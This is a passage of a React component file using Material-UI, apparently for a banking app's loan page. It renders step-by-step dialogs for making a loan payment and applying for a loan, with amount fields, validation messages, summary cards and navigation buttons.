                <Typography variant="h5" gutterBottom fontWeight="bold">Step 2: Enter Your Payment Amount</Typography>
                <Typography variant="body1" color="text.secondary" gutterBottom>Enter the amount you wish to pay towards your loan</Typography>
              </Grid>
              
              <Grid item xs={12}>
                <TextField
                  label="Payment Amount (USD)"
                  type="number"
                  fullWidth
                  value={paymentAmount}
                  onChange={(e) => setPaymentAmount(e.target.value)}
                  error={paymentAmount > selectedLoan?.remaining}
                  helperText={paymentAmount > selectedLoan?.remaining ? `Maximum payment is $${selectedLoan?.remaining?.toLocaleString()}` : `Enter an amount up to $${selectedLoan?.remaining?.toLocaleString()}`}
                  InputProps={{ inputProps: { min: 50, max: selectedLoan?.remaining, step: 0.01 } }}
                  sx={{ mt: 1 }}
                />
              </Grid>

              {/* Navigation buttons */}
              <Grid item xs={6}>
                <Button 
                  variant="outlined" 
                  size="large" 
                  fullWidth
                  onClick={() => setLoanPaymentStep(0)}
                  sx={{ py: 2, mt: 2 }}
                >
                  ← Back to Review
                </Button>
              </Grid>
              <Grid item xs={6}>
                <Button 
                  variant="contained" 
                  size="large" 
                  fullWidth
                  onClick={() => setLoanPaymentStep(2)}
                  disabled={!paymentAmount || paymentAmount > selectedLoan?.remaining || paymentAmount < 50}
                  sx={{ background: 'linear-gradient(135deg, #0066FF 0%, #00BFFF 100%)', py: 2, mt: 2, fontSize: '1.1rem' }}
                >
                  Continue to Confirm →
                </Button>
              </Grid>
            </Grid>
          )}

          {/* Step 3: Submit Payment */}
          {loanPaymentStep === 2 && (
            <Grid container spacing={3}>
              <Grid item xs={12}>
                <Typography variant="h5" gutterBottom fontWeight="bold">Step 3: Confirm Your Payment</Typography>
                <Typography variant="body1" color="text.secondary" gutterBottom>Review your payment and submit</Typography>
              </Grid>
              
              <Grid item xs={12}>
                <Card sx={{ p: 3 }}>
                  <Typography variant="h6" gutterBottom>Payment Summary</Typography>
                  <Box mt={2}>
                    <Typography variant="body2" display="block" sx={{ mb: 1 }}><strong>Loan Type:</strong> {selectedLoan?.type}</Typography>
                    <Typography variant="body2" display="block" sx={{ mb: 1 }}><strong>Payment Amount:</strong> ${parseFloat(paymentAmount).toLocaleString()}</Typography>
                    <Typography variant="body2" display="block" sx={{ mb: 1 }}><strong>New Remaining Balance:</strong> ${(selectedLoan?.remaining - parseFloat(paymentAmount)).toLocaleString()}</Typography>
                  </Box>
                </Card>
              </Grid>

              {/* Navigation buttons */}
              <Grid item xs={6}>
                <Button 
                  variant="outlined" 
                  size="large" 
                  fullWidth
                  onClick={() => setLoanPaymentStep(1)}
                  sx={{ py: 2, mt: 2 }}
                >
                  ← Back to Edit
                </Button>
              </Grid>
              <Grid item xs={6}>
                <Button 
                  variant="contained" 
                  size="large" 
                  fullWidth
                  onClick={() => {
                    handlePaymentSubmit();
                    setOpenPaymentDialog(false);
                    setLoanPaymentStep(0); // Reset stepper for next time
                  }}
                  sx={{ background: 'linear-gradient(135deg, #00AA33 0%, #00CC44 100%)', py: 2, mt: 2, fontSize: '1.1rem' }}
                >
                  ✅ Submit Payment
                </Button>
              </Grid>
            </Grid>
          )}
        </DialogContent>
      </Dialog>

      {/* Apply Loan Dialog */}
      <Dialog 
        open={openApplyDialog} 
        onClose={() => setOpenApplyDialog(false)} 
        maxWidth="md" 
        fullWidth
        PaperProps={{
          sx: {
            borderRadius: '24px',
            overflow: 'hidden',
            boxShadow: '0 50px 150px -30px rgba(0,200,150,0.4)'
          }
        }}
      >
        <DialogTitle sx={{ 
          background: 'linear-gradient(135deg, #0066FF 0%, #00BFFF 100%)',
          color: 'white',
          fontWeight: 700,
          position: 'relative',
          py: 4,
          px: 5,
          fontSize: '1.5rem'
        }}>
          Apply for {selectedLoanType?.type} Loan
          <IconButton
            aria-label="close"
            onClick={() => setOpenApplyDialog(false)}
            sx={{ 
              position: 'absolute', 
              right: 16, 
              top: '50%',
              transform: 'translateY(-50%)',
              color: 'white',
              transition: 'all 0.3s ease',
              '&:hover': {
                backgroundColor: 'rgba(255,255,255,0.15)',
                transform: 'translateY(-50%) scale(1.1)'
              }
            }}
          >
            <Close fontSize="large" />
          </IconButton>
        </DialogTitle>
        <DialogContent sx={{ pt: 5, px: 5, pb: 4 }}>
          {/* Loan Application Stepper */}
          <Stepper 
            activeStep={loanApplicationStep} 
            sx={{ 
              mb: 5,
              '& .MuiStepLabel-root': {
                '& .MuiStepLabel-label': {
                  fontSize: '0.95rem',
                  fontWeight: 500
                }
              },
              '& .MuiStepConnector-line': {
                borderColor: 'rgba(0,102,255,0.2)'
              },
              '& .Mui-active .MuiStepIcon-root': {
                color: '#0066ff !important'
              }
            }}
          >
            {['Step 1: Review Loan Terms', 'Step 2: Enter Loan Details', 'Step 3: Submit Application'].map((label) => (
              <Step key={label}>
                <StepLabel>{label}</StepLabel>
              </Step>
            ))}
          </Stepper>

          {/* Step 1: Review Loan Terms */}
          {loanApplicationStep === 0 && (
            <Grid container spacing={3}>
              <Grid item xs={12}>
                <Typography variant="h5" gutterBottom fontWeight="bold">Step 1: Review Your Loan Terms</Typography>
                <Typography variant="body1" color="text.secondary" gutterBottom>Please review the terms of your {selectedLoanType?.type} loan before proceeding</Typography>
              </Grid>
              
              <Grid item xs={12} md={6}>
                <Card sx={{ p: 3, height: '100%' }}>
                  <Typography variant="h6" gutterBottom>Loan Details</Typography>
                  <Box mt={2}>
                    <Typography variant="body2" display="block" sx={{ mb: 1 }}><strong>Loan Type:</strong> {selectedLoanType?.type}</Typography>
                    <Typography variant="body2" display="block" sx={{ mb: 1 }}><strong>Interest Rate:</strong> {selectedLoanType?.rate}% p.a.</Typography>
                    <Typography variant="body2" display="block" sx={{ mb: 1 }}><strong>Maximum Amount:</strong> ${selectedLoanType?.maxAmount?.toLocaleString()}</Typography>
                  </Box>
                </Card>
              </Grid>
              
              <Grid item xs={12}>
                <Button 
                  variant="contained" 
                  size="large" 
                  fullWidth
                  onClick={() => setLoanApplicationStep(1)}
                  sx={{ background: 'linear-gradient(135deg, #0066FF 0%, #00BFFF 100%)', py: 2, mt: 2, fontSize: '1.1rem' }}
                >
                  Continue to Enter Loan Amount →
                </Button>
              </Grid>
            </Grid>
          )}

          {/* Step 2: Enter Loan Details */}
          {loanApplicationStep === 1 && (
            <Grid container spacing={3}>
              <Grid item xs={12}>
                <Typography variant="h5" gutterBottom fontWeight="bold">Step 2: Enter Your Loan Details</Typography>
                <Typography variant="body1" color="text.secondary" gutterBottom>Enter the amount you wish to borrow</Typography>
              </Grid>
              
              <Grid item xs={12}>
                <TextField
                  label="Loan Amount (USD)"
                  type="number"
                  fullWidth
                  value={loanAmount}
                  onChange={(e) => setLoanAmount(e.target.value)}
                  error={loanAmount > selectedLoanType?.maxAmount}
                  helperText={loanAmount > selectedLoanType?.maxAmount ? `Maximum loan amount is $${selectedLoanType?.maxAmount?.toLocaleString()}` : `Enter an amount up to $${selectedLoanType?.maxAmount?.toLocaleString()}`}
                  InputProps={{ inputProps: { min: 1000, max: selectedLoanType?.maxAmount, step: 0.01 } }}
                  sx={{ mt: 1 }}
                />
              </Grid>

              {/* Navigation buttons */}
              <Grid item xs={6}>
                <Button 
                  variant="outlined" 
                  size="large" 
                  fullWidth
                  onClick={() => setLoanApplicationStep(0)}
                  sx={{ py: 2, mt: 2 }}
                >
                  ← Back to Review
                </Button>
              </Grid>
              <Grid item xs={6}>
                <Button 
                  variant="contained" 
                  size="large" 
                  fullWidth
                  onClick={() => setLoanApplicationStep(2)}
                  disabled={!loanAmount || loanAmount > selectedLoanType?.maxAmount || loanAmount < 1000}
                  sx={{ background: 'linear-gradient(135deg, #0066FF 0%, #00BFFF 100%)', py: 2, mt: 2, fontSize: '1.1rem' }}
                >
                  Continue to Submit →
                </Button>
              </Grid>
            </Grid>
          )}

          {/* Step 3: Submit Application */}
          {loanApplicationStep === 2 && (
            <Grid container spacing={3}>
              <Grid item xs={12}>
                <Typography variant="h5" gutterBottom fontWeight="bold">Step 3: Submit Your Loan Application</Typography>
                <Typography variant="body1" color="text.secondary" gutterBottom>Review your application and submit</Typography>
              </Grid>
              
              <Grid item xs={12}>
                <Card sx={{ p: 3 }}>
                  <Typography variant="h6" gutterBottom>Application Summary</Typography>
                  <Box mt={2}>
                    <Typography variant="body2" display="block" sx={{ mb: 1 }}><strong>Loan Type:</strong> {selectedLoanType?.type}</Typography>
                    <Typography variant="body2" display="block" sx={{ mb: 1 }}><strong>Requested Amount:</strong> ${parseFloat(loanAmount).toLocaleString()}</Typography>
                    <Typography variant="body2" display="block" sx={{ mb: 1 }}><strong>Interest Rate:</strong> {selectedLoanType?.rate}% p.a.</Typography>
                  </Box>
                </Card>
              </Grid>

              {/* Navigation buttons */}
              <Grid item xs={6}>
                <Button 
                  variant="outlined" 
                  size="large" 
                  fullWidth
                  onClick={() => setLoanApplicationStep(1)}
                  sx={{ py: 2, mt: 2 }}
                >
                  ← Back to Edit
                </Button>
              </Grid>
              <Grid item xs={6}>
                <Button 
                  variant="contained" 
                  size="large" 
                  fullWidth
                  onClick={() => {
                    handleApplySubmit();
                    setOpenApplyDialog(false);
                    setLoanApplicationStep(0); // Reset stepper for next time
                  }}
                  sx={{ background: 'linear-gradient(135deg, #00AA33 0%, #00CC44 100%)', py: 2, mt: 2, fontSize: '1.1rem' }}
                >
                  ✅ Submit Application
                </Button>
              </Grid>
            </Grid>
          )}
        </DialogContent>
      </Dialog>
      </motion.div>
      </Box>
    </Box>
  );
};

export default Loans;